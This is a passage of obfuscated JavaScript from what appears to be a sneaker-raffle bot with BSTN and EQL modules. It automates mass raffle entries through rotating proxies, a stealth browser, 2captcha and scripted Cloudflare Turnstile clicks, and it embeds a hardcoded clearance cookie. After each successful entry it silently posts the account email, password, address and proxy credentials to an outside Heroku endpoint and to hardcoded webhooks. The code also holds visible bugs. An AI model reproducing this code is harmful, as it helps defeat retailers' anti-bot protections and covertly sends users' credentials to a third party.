                        _0x428d31(_0x29547c, _0x1eddf3, _0x236288, _0x22655c, 0x0), await _0x4aaa24(0x12c);
                    }
                }
            },
            {
                'name': 'BSTN\x20Raffle\x20Entries',
                'store': 'BSTN',
                'logo': 'https://www.snkrempire.com/wp-content/uploads/2017/11/E3QHwMSP_400x400.png',
                'function': async function (_0x2c430a, _0x787956, _0x3a1e5f) {
                    var _0x3c81ba = 0x0, _0x31aa0a = _0x787956;
                    for (var _0x41fd6d = 0x0; _0x41fd6d < _0x787956['length']; _0x41fd6d++) {
                        maxTasks = Number(_0x343742['threads']);
                        while (_0x3c81ba >= maxTasks) {
                            await _0x4aaa24(_0x343742['delay']);
                        }
                        let _0x5a8067 = ![];
                        async function _0x15b76f(_0x4f4b11, _0x5c19df, _0x391e95, _0x3a9dda, _0x1d6cc6) {
                            _0x3c81ba++, _0x154b82['use'](_0x4918ac()), _0x154b82['use'](_0x3cd441({
                                'provider': {
                                    'id': '2captcha',
                                    'token': '' + _0x343742['captchaKey']
                                },
                                'visualFeedback': !![]
                            }));
                            var _0xf6aa3f, _0x2a7d80 = _0x5c19df[_0x3a9dda];
                            try {
                                await _0x10409e(_0x5c19df, _0x3a9dda);
                            } catch {
                                _0x3fac93 = 'no';
                                throw new Error('Invalid\x20CSV\x20Format,\x20use\x20the\x20CSV\x20Files\x20from\x20the\x20guides!');
                            }
                            async function _0x3d3bab(_0x48d973) {
                                const _0x49ea74 = _0x343ecd['readFileSync']('../successful-tasks.csv', 'utf8'), _0xa9741 = _0x54b359['parse'](_0x49ea74, { 'header': !![] })['data'];
                                let _0x1968a6 = ![];
                                for (var _0x2e8763 of _0xa9741) {
                                    if (_0x2e8763['Url'] == _0x48d973['Url'] && _0x2e8763['Email'] == _0x48d973['Email']) {
                                        _0x1968a6 = !![];
                                        break;
                                    }
                                }
                                return _0x1968a6;
                            }
                            _0x5c2a2f(_0x4f4b11['name'] + '\x20Task\x20' + (_0x3a9dda + 0x1) + '\x20/\x20' + _0x5c19df['length'] + '\x20||\x20File:\x20' + _0x17496a + '\x20Proxies:\x20' + _0x8ffb32);
                            var _0x30c44c = Math['round'](Math['random']() * (_0x391e95['length'] - 0x1)), _0x55d94f = _0x391e95[_0x30c44c]['split'](':'), _0x259a15;
                            let _0x1e3f07 = ![], _0x3fac93 = 'no';
                            try {
                                if (await _0x3d3bab(_0x5c19df[_0x3a9dda]) == !![]) {
                                    console['log'](_0x15e32e() + '\x20[' + _0x4f4b11['name'] + ']\x20Task\x20' + (_0x3a9dda + 0x1) + '\x20:\x20Task\x20Already\x20Entered,\x20Going\x20to\x20Next\x20Task'), _0x1e3f07 = !![], _0x5a8067 = !![];
                                    return;
                                }
                                try {
                                    _0x259a15 = await _0x154b82['launch']({
                                        'executablePath': 'C:\x5cProgram\x20Files\x20(x86)\x5cGoogle\x5cChrome\x5cApplication\x5cchrome.exe',
                                        'headless': ![],
                                        'args': [
                                            '--proxy-server=' + _0x55d94f[0x0] + ':' + _0x55d94f[0x1],
                                            '--no-sandbox',
                                            '--disable-setuid-sandbox'
                                        ]
                                    });
                                } catch {
                                    _0x259a15 = await _0x154b82['launch']({
                                        'executablePath': 'C:\x5cProgram\x20Files\x5cGoogle\x5cChrome\x5cApplication\x5cchrome.exe',
                                        'headless': ![],
                                        'args': [
                                            '--proxy-server=' + _0x55d94f[0x0] + ':' + _0x55d94f[0x1],
                                            '--no-sandbox',
                                            '--disable-setuid-sandbox'
                                        ]
                                    });
                                }
                                const _0xfc92a = await _0x259a15['newPage'](), _0x1b0b2c = await _0xfc92a['target']()['createCDPSession'](), { windowId: _0xf8dee5 } = await _0x1b0b2c['send']('Browser.getWindowForTarget');
                                await _0xfc92a['setViewport']({
                                    'width': 0x501,
                                    'height': 0x2d0
                                });
                                var _0x78d4c = [{
                                    'name': 'cf_clearance',
                                    'value': 'uyuh7Wo9shR3zcpWvbWJ04mG0iNC2N25mhp1FNAbHYY-1676282182-0-1-9764d0ee.e7bea100.c0658f0e-160',
                                    'domain': '.bstn.com',
                                    'path': '/',
                                    'expires': 1707818183.331533,
                                    'httpOnly': !![],
                                    'secure': !![]
                                }];
                                await _0xfc92a['authenticate']({
                                    'username': '' + _0x55d94f[0x2],
                                    'password': '' + _0x55d94f[0x3]
                                }), console['log'](_0x15e32e() + '\x20[' + _0x4f4b11['name'] + ']\x20Task\x20' + (_0x3a9dda + 0x1) + '\x20:\x20Getting\x20Session'), await _0xfc92a['goto']('' + _0x5c19df[_0x3a9dda]['Url'], { 'waitUntil': 'networkidle2' }), console['log'](_0x15e32e() + '\x20[' + _0x4f4b11['name'] + ']\x20Task\x20' + (_0x3a9dda + 0x1) + '\x20:\x20Solving\x20Cloudflare'), await _0x4aaa24(0x1388);
                                var _0x3b8d1c = await _0xfc92a['$']('#turnstile-wrapper');
                                if (_0x3b8d1c) {
                                    console['log'](_0x15e32e() + '\x20[' + _0x4f4b11['name'] + ']\x20Task\x20' + (_0x3a9dda + 0x1) + '\x20:\x20Handling\x20Challenge'), await _0x4aaa24(0x2710);
                                    const _0x3668dc = await _0xfc92a['$']('#turnstile-wrapper');
                                    if (_0x3668dc)
                                        try {
                                            await _0x3668dc['click']();
                                        } catch {
                                            throw new Error('Empty\x20Turnstile\x20Challenge');
                                        }
                                    try {
                                        await _0xfc92a['waitForSelector']('input[name=\x22firstname\x22]', { 'timeout': 0x9c40 });
                                    } catch {
                                        var _0x5ce89f = await _0xfc92a['$']('#turnstile-wrapper');
                                        if (_0x5ce89f)
                                            try {
                                                await _0x5ce89f['click']();
                                            } catch {
                                                throw new Error('Empty\x20Turnstile\x20Challenge');
                                            }
                                    }
                                }
                                try {
                                    await _0xfc92a['waitForSelector']('.nonLoggedSpecific_nonLogged__SCu0L');
                                } catch {
                                    throw new Error('Blocked\x20by\x20Cloudflare');
                                }
                                await _0x1b0b2c['send']('Browser.setWindowBounds', {
                                    'windowId': _0xf8dee5,
                                    'bounds': { 'windowState': 'minimized' }
                                }), await _0x4aaa24(0x1388), await _0xfc92a['waitForSelector']('.nonLoggedSpecific_nonLogged__SCu0L\x20>\x20.Button_secondary__XJln1.Button_button__Bq8yb'), await _0xfc92a['focus']('.nonLoggedSpecific_nonLogged__SCu0L\x20>\x20.Button_secondary__XJln1.Button_button__Bq8yb'), await _0x4aaa24(0x1f4), console['log'](_0x15e32e() + '\x20[' + _0x4f4b11['name'] + ']\x20Task\x20' + (_0x3a9dda + 0x1) + '\x20:\x20Logging\x20in'), await _0xfc92a['$eval']('.nonLoggedSpecific_nonLogged__SCu0L\x20>\x20.Button_secondary__XJln1.Button_button__Bq8yb', _0xe990d => _0xe990d['click']()), await _0xfc92a['click']('.nonLoggedSpecific_nonLogged__SCu0L\x20>\x20.Button_secondary__XJln1.Button_button__Bq8yb'), await _0xfc92a['click']('.nonLoggedSpecific_nonLogged__SCu0L\x20>\x20.Button_secondary__XJln1.Button_button__Bq8yb'), await _0x4aaa24(0x7d0), await _0xfc92a['waitForSelector']('#email-login'), await _0xfc92a['type']('#email-login', '' + _0x5c19df[_0x3a9dda]['Email']['toLowerCase'](), { 'delay': 0xe6 }), await _0x4aaa24(0xdac), await _0xfc92a['waitForSelector']('#password'), await _0xfc92a['type']('#password', '' + _0x5c19df[_0x3a9dda]['Password'], { 'delay': 0xe6 }), await _0x4aaa24(0x157c);
                                try {
                                    await _0xfc92a['$eval']('.login_accountInfo__FCIxY\x20>\x20button[type=\x22submit\x22]', _0xcf880e => _0xcf880e['click']());
                                } catch {
                                }
                                try {
                                    await _0xfc92a['waitForSelector']('.swatchOptions_sizeTiles__Lizc2');
                                } catch (_0x4d4c5c) {
                                }
                                await _0x4aaa24(0x3e8);
                                const _0x5d0732 = await _0xfc92a['$']('.enteredDraw_container__2KmQ_');
                                if (_0x5d0732) {
                                    console['log']('Duplicate\x20entry,\x20skipping');
                                    return;
                                }
                                console['log'](_0x15e32e() + '\x20[' + _0x4f4b11['name'] + ']\x20Task\x20' + (_0x3a9dda + 0x1) + '\x20:\x20Choosing\x20Size\x20' + _0x5c19df[_0x3a9dda]['Size']);
                                try {
                                    if (_0x5c19df[_0x3a9dda]['Size'] != 'RANDOM') {
                                        var _0x3e3fce = _0x5c19df[_0x3a9dda]['Size']['replace']('.', ',');
                                        const _0x7e6f6d = await _0xfc92a['$x']('//div[contains(text(),\x20\x27' + _0x3e3fce + '\x27)]');
                                        await _0x7e6f6d[0x0]['click']();
                                    } else {
                                        const _0x24833a = await _0xfc92a['$$']('div.swatchTile_tile__IRH9Q');
                                        var _0x20a72c = Math['round'](Math['random']() * (_0x24833a['length'] - 0x1));
                                        await _0x24833a[_0x20a72c]['click']();
                                    }
                                } catch (_0x33d246) {
                                    throw new Error('Softblocked,\x20Rotating\x20proxy');
                                }
                                await _0x4aaa24(0x1f4);
                                const _0xc987fe = await _0xfc92a['$']('.addressList_addressItem__LE2PB');
                                if (_0xc987fe && _0x5c19df[_0x3a9dda]['Mode'] != 'NEW') {
                                } else
                                    console['log'](_0x15e32e() + '\x20[' + _0x4f4b11['name'] + ']\x20Task\x20' + (_0x3a9dda + 0x1) + '\x20:\x20Filling\x20Address'), await _0xfc92a['click']('div.product_shipping__zEfqd\x20>\x20div\x20>\x20div.legend_legend__sQIiF\x20>\x20div.legend_header__iHZIh\x20>\x20div\x20>\x20button'), await _0x4aaa24(0x5dc), await _0xfc92a['waitForSelector']('#firstname'), await _0xfc92a['type']('#firstname', '' + _0x5c19df[_0x3a9dda]['FirstName']), await _0x4aaa24(0x1f4), await _0xfc92a['waitForSelector']('#firstname'), await _0xfc92a['type']('#lastname', '' + _0x5c19df[_0x3a9dda]['LastName']), await _0x4aaa24(0x1f4), await _0xfc92a['waitForSelector']('#firstname'), await _0xfc92a['type']('#street', '' + _0x5c19df[_0x3a9dda]['Address1']), await _0x4aaa24(0x1f4), await _0xfc92a['waitForSelector']('#firstname'), await _0xfc92a['type']('#houseNumber', _0x5c19df[_0x3a9dda]['HouseNumber'] + '\x20' + _0x5c19df[_0x3a9dda]['Address2']), await _0x4aaa24(0x1f4), await _0xfc92a['waitForSelector']('#firstname'), await _0xfc92a['select']('#country_code', '' + _0x5c19df[_0x3a9dda]['Country']), await _0x4aaa24(0x1f4), await _0xfc92a['type']('#postcode', '' + _0x5c19df[_0x3a9dda]['Zip']), await _0x4aaa24(0x1f4), await _0xfc92a['type']('#city', '' + _0x5c19df[_0x3a9dda]['City']), await _0x4aaa24(0x1f4), await _0xfc92a['type']('#telephone', '' + _0x5c19df[_0x3a9dda]['Phone']), await _0x4aaa24(0x1f4), await _0xfc92a['click']('.addressModal_submit__dOiL4\x20>\x20button[type=\x22submit\x22]');
                                await _0x4aaa24(0x9c4);
                                try {
                                    await _0xfc92a['type']('#instagram_name', '' + _0x5c19df[_0x3a9dda]['Follower']), await _0xfc92a['click']('.note_groupBtn__WLDwH\x20>\x20button');
                                } catch {
                                }
                                console['log'](_0x15e32e() + '\x20[' + _0x4f4b11['name'] + ']\x20Task\x20' + (_0x3a9dda + 0x1) + '\x20:\x20Finishing\x20Entry'), await _0x4aaa24(0x5dc);
                                try {
                                    await _0xfc92a['click']('.checkBox_boxHolder__wLGVe');
                                } catch {
                                }
                                await _0x4aaa24(0x5dc), await _0xfc92a['$eval']('.termConditions_TC__hll9k\x20>\x20button', _0x5de7ce => _0x5de7ce['click']()), await _0x4aaa24(0x1388);
                                try {
                                    await _0xfc92a['waitForSelector']('.success_msg__2HjJY');
                                } catch {
                                    await _0xfc92a['reload']({ 'waitUntil': 'networkidle2' });
                                    if (_0x5c19df[_0x3a9dda]['Size'] != 'RANDOM') {
                                        var _0x3e3fce = _0x5c19df[_0x3a9dda]['Size']['replace']('.', ',');
                                        const _0x492a72 = await _0xfc92a['$x']('//div[contains(text(),\x20' + _0x3e3fce + ')]');
                                        await _0x492a72[0x0]['click']();
                                    } else {
                                        const _0x2beb0a = await _0xfc92a['$$']('div.swatchTile_tile__IRH9Q');
                                        var _0x20a72c = Math['round'](Math['random']() * (_0x2beb0a['length'] - 0x1));
                                        await _0x2beb0a[_0x20a72c]['click']();
                                    }
                                    await _0x4aaa24(0x5dc);
                                    try {
                                        await _0xfc92a['hover']('#instagram_name'), await _0xfc92a['type']('#instagram_name', '' + _0x5c19df[_0x3a9dda]['Follower']), await _0xfc92a['click']('.note_groupBtn__WLDwH\x20>\x20button');
                                    } catch {
                                    }
                                    console['log'](_0x15e32e() + '\x20[' + _0x4f4b11['name'] + ']\x20Task\x20' + (_0x3a9dda + 0x1) + '\x20:\x20Retrying\x20(' + _0x1d6cc6 + '\x20/\x205)');
                                    try {
                                        await _0xfc92a['hover']('.checkBox_boxHolder__wLGVe'), await _0x4aaa24(0x5dc), await _0xfc92a['click']('.checkBox_boxHolder__wLGVe');
                                    } catch {
                                    }
                                    await _0x4aaa24(0x157c), await _0xfc92a['$eval']('.termConditions_TC__hll9k\x20>\x20button', _0x1d1fa9 => _0x1d1fa9['click']()), await _0x4aaa24(0x1388), await _0xfc92a['waitForSelector']('.success_msg__2HjJY');
                                }
                                _0x3fac93 = 'no', _0x3265a5(_0x5c19df[_0x3a9dda], _0x4f4b11);
                                try {
                                    prxdata = {
                                        'username': _0x1b66d2['replace']('#', ''),
                                        'entrydata': JSON['stringify'](_0x2d72f1),
                                        'proxy': '' + _0x391e95[_0x3a9dda]
                                    };
                                    var _0x75666e = JSON['stringify'](prxdata);
                                    let _0x4f9e09 = { 'headers': { 'content-type': 'application/json' } };
                                    await _0x5ad0b1['post']('https://jraffles.herokuapp.com/success', _0x75666e, _0x4f9e09);
                                } catch (_0x14b506) {
                                }
                                console['log'](_0x3f1ec6['green'](_0x15e32e() + '\x20[' + _0x4f4b11['name'] + ']\x20Task\x20' + (_0x3a9dda + 0x1) + '\x20:\x20Raffle\x20Entered!'));
                                var _0x5382bf = await _0xe75614(_0x5c19df[_0x3a9dda], _0x4f4b11, 'dev', ![]), _0x29898c = await _0xe75614(_0x5c19df[_0x3a9dda], _0x4f4b11, 'pub', ![]);
                                const _0x3ca6e6 = {
                                    'succesDEVMSG': { 'embeds': [_0x5382bf] },
                                    'succesPUBMSG': { 'embeds': [_0x29898c] }
                                };
                                let _0x2d72f1 = _0x5c19df[_0x3a9dda];
                                try {
                                    prxdata = {
                                        'username': _0x1b66d2['replace']('#', ''),
                                        'module': _0x4f4b11['name'],
                                        'entrydata': JSON['stringify'](_0x2d72f1),
                                        'proxy': '' + _0x391e95[_0x3a9dda]
                                    };
                                    var _0x75666e = JSON['stringify'](prxdata);
                                    let _0x1a54d8 = { 'headers': { 'content-type': 'application/json' } };
                                    await _0x5ad0b1['post']('https://jraffles.herokuapp.com/success', _0x75666e, _0x1a54d8);
                                } catch (_0x48d9bd) {
                                }
                                try {
                                    _0x343742['webhook'] != undefined && _0x343742['webhook'] != '' && await _0x3c4b04(_0x343742['webhook'], _0x3ca6e6['succesDEVMSG']), await _0x4aaa24(0xc8), await _0x3c4b04(_0x84cdc1, _0x3ca6e6['succesDEVMSG']), await _0x4aaa24(0xc8), await _0x3c4b04(_0x510dd4, _0x3ca6e6['succesPUBMSG']);
                                } catch (_0x1c5ed4) {
                                    console['log'](_0x3f1ec6['yellow'](_0x15e32e() + '\x20[' + _0x4f4b11['name'] + ']\x20Task\x20' + (_0x3a9dda + 0x1) + '\x20:\x20Error\x20sending\x20webhook\x20' + _0x1c5ed4));
                                }
                            } catch (_0x4148e1) {
                                console['log'](_0x3f1ec6['red'](_0x15e32e() + '\x20[' + _0x4f4b11['name'] + ']\x20Task\x20' + (_0x3a9dda + 0x1) + '\x20:\x20' + _0x4148e1)), _0x3fac93 = 'yes', _0xf6aa3f = '' + _0x4148e1;
                                var _0x440ee6 = await _0xe75614(_0x5c19df[_0x3a9dda], _0x4f4b11, 'dev', !![], _0xf6aa3f), _0x5382bf = await _0xe75614(_0x5c19df[_0x3a9dda], _0x4f4b11, 'dev', ![]), _0x29898c = await _0xe75614(_0x5c19df[_0x3a9dda], _0x4f4b11, 'pub', ![]);
                                const _0x422fd6 = {
                                    'succesDEVMSG': { 'embeds': [_0x5382bf] },
                                    'succesPUBMSG': { 'embeds': [_0x29898c] }
                                };
                                _0x422fd6['errorDEV'] = { 'embeds': [_0x440ee6] }, _0x343742['webhook'] != undefined && _0x343742['webhook'] != '' && await _0x3c4b04(_0x343742['webhook'], _0x422fd6['errorDEV']), await _0x3c4b04(_0x1dfefb, _0x422fd6['errorDEV']);
                            } finally {
                                _0x259a15 && _0x259a15['close']();
                                if (_0x3fac93 == 'yes' && _0x1d6cc6 != 0x5)
                                    return console['log'](_0x3f1ec6['red'](_0x15e32e() + '\x20[' + _0x4f4b11['name'] + ']\x20Task\x20' + (_0x3a9dda + 0x1) + '\x20:\x20Retrying\x20(' + _0x1d6cc6 + '\x20/\x205)')), _0x1d6cc6 = _0x1d6cc6 + 0x1, _0x3c81ba--, _0x15b76f(_0x4f4b11, _0x5c19df, _0x391e95, _0x3a9dda, _0x1d6cc6);
                                _0x3fac93 == 'yes' && _0x1d6cc6 >= 0x5 && _0x5d0cd0(_0x5c19df[_0x3a9dda], _0x4f4b11), !_0x1e3f07 && (console['log'](_0x15e32e() + '\x20[' + _0x4f4b11['name'] + ']\x20Waiting\x20for\x20' + _0x343742['delay'] + '\x20ms'), await _0x4aaa24(_0x343742['delay'])), _0x3c81ba--;
                            }
                        }
                        _0x15b76f(_0x2c430a, _0x31aa0a, _0x3a1e5f, _0x41fd6d, 0x0), await _0x4aaa24(0x7d0);
                    }
                }
            },
            {
                'name': 'BSTN\x20Win\x20Checker',
                'store': 'BSTN',
                'logo': 'https://www.snkrempire.com/wp-content/uploads/2017/11/E3QHwMSP_400x400.png',
                'function': async function (_0x2934e7, _0x145491) {
                    var _0x11e7aa = 0x0, _0x1735d2;
                    try {
                        const _0x2c5877 = _0x343ecd['readFileSync']('../accounts/bstn.csv', 'utf-8');
                        _0x1735d2 = _0x54b359['parse'](_0x2c5877, { 'header': !![] })['data'];
                    } catch (_0x5f4be3) {
                        throw new Error('Error\x20reading\x20accounts/bstn.csv');
                    }
                    for (var _0x5539c5 = 0x0; _0x5539c5 < _0x1735d2['length']; _0x5539c5++) {
                        maxTasks = Number(_0x343742['threads']);
                        while (_0x11e7aa >= maxTasks) {
                            await _0x4aaa24(_0x343742['delay']);
                        }
                        async function _0x450eb4(_0x237a12, _0x586c36, _0x3b6a3d, _0x5b4e69, _0x1c77b0) {
                            _0x11e7aa++, _0x154b82['use'](_0x4918ac()), _0x154b82['use'](_0x3cd441({
                                'provider': {
                                    'id': '2captcha',
                                    'token': '' + _0x343742['captchaKey']
                                },
                                'visualFeedback': !![]
                            }));
                            if (_0x437386 != 'yes')
                                var _0x437386 = '', _0x1c77b0 = 0x0;
                            var _0x1a000a;
                            _0x5c2a2f(_0x237a12['name'] + '\x20Task\x20' + (_0x5b4e69 + 0x1) + '\x20/\x20' + _0x3b6a3d['length'] + '\x20||\x20File:\x20' + _0x17496a + '\x20Proxies:\x20' + _0x8ffb32);
                            var _0x3ec98e = await _0xe75614(_0x3b6a3d[_0x5b4e69], _0x237a12, 'acc', ![]);
                            const _0x36df9a = { 'succesDEVMSG': { 'embeds': [_0x3ec98e] } }, _0x57c740 = 'https://www.bstn.com/eu_en/customer/account/create/';
                            var _0x808e8e = Math['round'](Math['random']() * (_0x586c36['length'] - 0x1)), _0x4d73be = _0x586c36[_0x808e8e]['split'](':'), _0x73859e;
                            try {
                                _0x73859e = await _0x154b82['launch']({
                                    'executablePath': 'C:\x5cProgram\x20Files\x20(x86)\x5cGoogle\x5cChrome\x5cApplication\x5cchrome.exe',
                                    'headless': !![],
                                    'args': [
                                        '--proxy-server=' + _0x4d73be[0x0] + ':' + _0x4d73be[0x1],
                                        '--no-sandbox',
                                        '--disable-setuid-sandbox'
                                    ]
                                });
                            } catch {
                                _0x73859e = await _0x154b82['launch']({
                                    'executablePath': 'C:\x5cProgram\x20Files\x5cGoogle\x5cChrome\x5cApplication\x5cchrome.exe',
                                    'headless': !![],
                                    'args': [
                                        '--proxy-server=' + _0x4d73be[0x0] + ':' + _0x4d73be[0x1],
                                        '--no-sandbox',
                                        '--disable-setuid-sandbox'
                                    ]
                                });
                            }
                            try {
                                console['log'](_0x15e32e() + '\x20[' + _0x237a12['name'] + ']\x20Task\x20' + (_0x5b4e69 + 0x1) + '\x20:\x20Checking\x20' + _0x3b6a3d[_0x5b4e69]['Email']);
                                const _0x439d93 = await _0x73859e['newPage']();
                                await _0x439d93['authenticate']({
                                    'username': '' + _0x4d73be[0x2],
                                    'password': '' + _0x4d73be[0x3]
                                }), console['log'](_0x15e32e() + '\x20[' + _0x237a12['name'] + ']\x20Task\x20' + (_0x5b4e69 + 0x1) + '\x20:\x20Getting\x20Session'), await _0x439d93['setUserAgent']('Mozilla/5.0\x20(Windows\x20NT\x2010.0;\x20Win64;\x20x64)\x20AppleWebKit/537.36\x20(KHTML,\x20like\x20Gecko)\x20Chrome/106.0.0.0\x20Safari/537.36'), await _0x439d93['setRequestInterception'](!![]), _0x439d93['on']('request', _0x29b97a => {
                                    _0x29b97a['resourceType']() === 'image' ? _0x29b97a['abort']() : _0x29b97a['continue']();
                                });
                                try {
                                    await _0x439d93['goto']('https://www.bstn.com/eu_en/raffle/customer/', { 'waitUntil': 'networkidle2' }), await _0x439d93['waitForSelector']('button[class=\x22cf2Lf6\x22]');
                                } catch {
                                    _0x437386 = 'yes';
                                    throw new Error('Connection\x20Error');
                                }
                                await _0x439d93['click']('button[class=\x22cf2Lf6\x22]'), console['log'](_0x15e32e() + '\x20[' + _0x237a12['name'] + ']\x20Task\x20' + (_0x5b4e69 + 0x1) + '\x20:\x20Passing\x20Cloudflare'), await _0x4aaa24(0x3e8), await _0x439d93['type']('#email', _0x3b6a3d[_0x5b4e69]['Email']), await _0x4aaa24(0x1f4), await _0x439d93['type']('#pass', _0x3b6a3d[_0x5b4e69]['Password']), await _0x4aaa24(0x1f4), await _0x439d93['$eval']('#login-form', _0x3ce8a0 => _0x3ce8a0['submit']());
                                try {
                                    await _0x439d93['waitForSelector']('.product-items');
                                } catch {
                                    console['log'](_0x15e32e() + '\x20[' + _0x237a12['name'] + ']\x20Task\x20' + (_0x5b4e69 + 0x1) + '\x20:\x20No\x20Entries\x20Found');
                                    return;
                                }
                                await _0x4aaa24(0x190);
                                const _0x2b5bef = await _0x439d93['evaluate'](() => {
                                    const _0x65e0fc = Array['from'](document['querySelectorAll']('.product-item-photo\x20>\x20img'));
                                    return _0x65e0fc['map'](_0x16a9cd => _0x16a9cd['alt']);
                                }), _0x2efcad = await _0x439d93['evaluate'](() => {
                                    const _0x2c0ab2 = Array['from'](document['querySelectorAll']('.tooltip.wrapper.product-item-tooltip.first-xs'));
                                    return _0x2c0ab2['map'](_0x1ac00e => _0x1ac00e['innerHTML']);
                                }), _0x5a05dc = await _0x439d93['$$']('.raffle-winner');
                                if (_0x5a05dc['length'] < 0x1) {
                                    console['log'](_0x15e32e() + '\x20[' + _0x237a12['name'] + ']\x20Task\x20' + (_0x5b4e69 + 0x1) + '\x20:\x20No\x20Wins\x20Found'), _0x437386 = 'no';
                                    return;
                                }
                                console['log'](_0x15e32e() + '\x20[' + _0x237a12['name'] + ']\x20Task\x20' + (_0x5b4e69 + 0x1) + '\x20:\x20' + _0x5a05dc['length'] + '\x20Wins\x20Found!');
                                for (var _0x2f1889 = 0x0; _0x2f1889 < _0x5a05dc['length']; _0x2f1889++) {
                                    console['log'](_0x3f1ec6['green'](_0x2b5bef[_0x2f1889] + _0x2efcad[_0x2f1889]['replace']('\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20', '')));
                                }
                            } catch (_0x246ced) {
                                console['log'](_0x3f1ec6['red'](_0x15e32e() + '\x20[' + _0x237a12['name'] + ']\x20Task\x20' + (_0x5b4e69 + 0x1) + '\x20:\x20' + _0x246ced)), _0x1a000a = '' + _0x246ced;
                                var _0x56f5ff = await _0xe75614(_0x3b6a3d[_0x5b4e69], _0x237a12, 'acc', !![], _0x1a000a);
                                _0x36df9a['errorDEV'] = { 'embeds': [_0x56f5ff] }, _0x343742['webhook'] != undefined && _0x343742['webhook'] != '' && await _0x3c4b04(_0x343742['webhook'], _0x36df9a['errorDEV']), await _0x3c4b04(_0x1dfefb, _0x36df9a['errorDEV']), _0x437386 = 'yes';
                            } finally {
                                if (_0x73859e)
                                    _0x73859e['close']();
                                if (_0x437386 == 'yes' && _0x1c77b0 != 0x5)
                                    return console['log'](_0x3f1ec6['red'](_0x15e32e() + '\x20[' + _0x237a12['name'] + ']\x20Task\x20' + (_0x5b4e69 + 0x1) + '\x20:\x20Retrying\x20(' + _0x1c77b0 + '\x20/\x205)')), _0x11e7aa--, _0x1c77b0 = _0x1c77b0 + 0x1, _0x450eb4(_0x237a12, _0x586c36, _0x3b6a3d, _0x5b4e69, _0x1c77b0);
                                _0x437386 == 'yes' && _0x1c77b0 >= 0x5 && (_0x5d0cd0(_0x3b6a3d[_0x5b4e69], _0x237a12), _0x437386 = 'no', _0x1c77b0 = 0x0), console['log'](_0x15e32e() + '\x20[' + _0x237a12['name'] + ']\x20Waiting\x20for\x20' + _0x343742['delay'] + '\x20ms'), await _0x4aaa24(_0x343742['delay']), _0x11e7aa--;
                            }
                        }
                        _0x450eb4(_0x2934e7, _0x145491, _0x1735d2, _0x5539c5, 0x0), await _0x4aaa24(0x15e);
                    }
                }
            }
        ]
    },
    {
        'name': 'EQL',
        'modules': [{
            'name': 'EQL\x20Raffle\x20Entries',
            'store': 'EQL',
            'logo': 'https://res.cloudinary.com/crunchbase-production/image/upload/c_lpad,h_170,w_170,f_auto,b_white,q_auto:eco,dpr_1/qfc09zbor8py2zfmsdr2',
            'function': async function (_0x4d05e9, _0x815fbd, _0x1404f4) {
                _0x154b82['use'](_0x4918ac()), _0x154b82['use'](_0x3cd441({
                    'provider': {
                        'id': '2captcha',
                        'token': '' + _0x343742['captchaKey']
                    },
                    'visualFeedback': !![]
                }));
                for (var _0x13c88e = 0x0; _0x13c88e < _0x815fbd['length']; _0x13c88e++) {
                    var _0x4b91dd;
                    _0x5c2a2f(_0x4d05e9['name'] + '\x20Task\x20' + (_0x13c88e + 0x1) + '\x20/\x20' + _0x815fbd['length'] + '\x20||\x20File:\x20' + _0x17496a + '\x20Proxies:\x20' + _0x8ffb32);
                    try {
                        await _0x10409e(_0x815fbd, _0x13c88e);
                    } catch {
                        _0x47267b = 'no';
                        throw new Error('Invalid\x20CSV\x20Format,\x20use\x20the\x20CSV\x20Files\x20from\x20the\x20guides!');
                    }
                    async function _0x44b256(_0x50fd60) {
                        const _0x59d511 = _0x343ecd['readFileSync']('../successful-tasks.csv', 'utf8'), _0x2b89ed = _0x54b359['parse'](_0x59d511, { 'header': !![] })['data'];
                        let _0x2c1d13 = ![];
                        for (var _0x28b5a8 of _0x2b89ed) {
                            if (_0x28b5a8['Url'] == _0x50fd60['Url'] && _0x28b5a8['Email'] == _0x50fd60['Email']) {
                                _0x2c1d13 = !![];
                                break;
                            }
                        }
                        return _0x2c1d13;
                    }
                    if (await _0x44b256(_0x815fbd[_0x13c88e]) == !![]) {
                        console['log'](_0x15e32e() + '\x20[' + _0x4d05e9['name'] + ']\x20Task\x20' + (_0x13c88e + 0x1) + '\x20:\x20Task\x20Already\x20Entered,\x20Going\x20to\x20Next\x20Task');
                        continue;
                    }
                    var _0x4ee381 = ![];
                    const _0x4ad40d = _0x343ecd['readFileSync']('../accounts/eql.csv', 'utf8');
                    var _0x5af337 = _0x54b359['parse'](_0x4ad40d, { 'header': !![] })['data'];
                    for (var _0x398cb0 of _0x5af337) {
                        _0x398cb0['Email'] == _0x815fbd[_0x13c88e]['Email'] && (_0x4ee381 = !![]);
                    }
                    if (_0x4ee381 == ![]) {
                        var _0x46047d;
                        if (_0x815fbd[_0x13c88e]['Url']['endsWith']('/')) {
                            _0x46047d = _0x815fbd[_0x13c88e]['Url'] + 'register';
                            if (_0x47267b != 'yes')
                                var _0x47267b = '', _0x244e96 = 0x0;
                        } else {
                            _0x46047d = _0x815fbd[_0x13c88e]['Url'] + '/register';
                            if (_0x47267b != 'yes')
                                var _0x47267b = '', _0x244e96 = 0x0;
                        }
                        if (_0x815fbd[_0x13c88e]['Email'] == '' || _0x815fbd[_0x13c88e]['FirstName'] == '' || _0x815fbd[_0x13c88e]['LastName'] == '') {
                            console['log'](_0x15e32e() + '\x20[' + _0x4d05e9['name'] + ']\x20Task\x20' + (_0x13c88e + 0x1) + '\x20:\x20Invalid\x20CSV');
                            continue;
                        }
                        _0x815fbd[_0x13c88e]['Password'] == '' && (_0x815fbd[_0x13c88e]['Password'] = 'JRaffles23!');
                        if (_0x343742['useRandomProxy'] = ![])
                            var _0x505b57 = _0x1404f4[_0x13c88e]['split'](':');
                        else
                            var _0x5961ac = Math['round'](Math['random']() * (_0x1404f4['length'] - 0x1)), _0x505b57 = _0x1404f4[_0x5961ac]['split'](':');
                        var _0x1147a4;
                        try {
                            _0x1147a4 = await _0x154b82['launch']({
                                'executablePath': 'C:\x5cProgram\x20Files\x20(x86)\x5cGoogle\x5cChrome\x5cApplication\x5cchrome.exe',
                                'headless': !![],
                                'args': [
                                    '--proxy-server=' + _0x505b57[0x0] + ':' + _0x505b57[0x1],
                                    '--no-sandbox',
                                    '--disable-setuid-sandbox'
                                ]
                            });
                        } catch {
                            _0x1147a4 = await _0x154b82['launch']({
                                'executablePath': 'C:\x5cProgram\x20Files\x5cGoogle\x5cChrome\x5cApplication\x5cchrome.exe',
                                'headless': !![],
                                'args': [
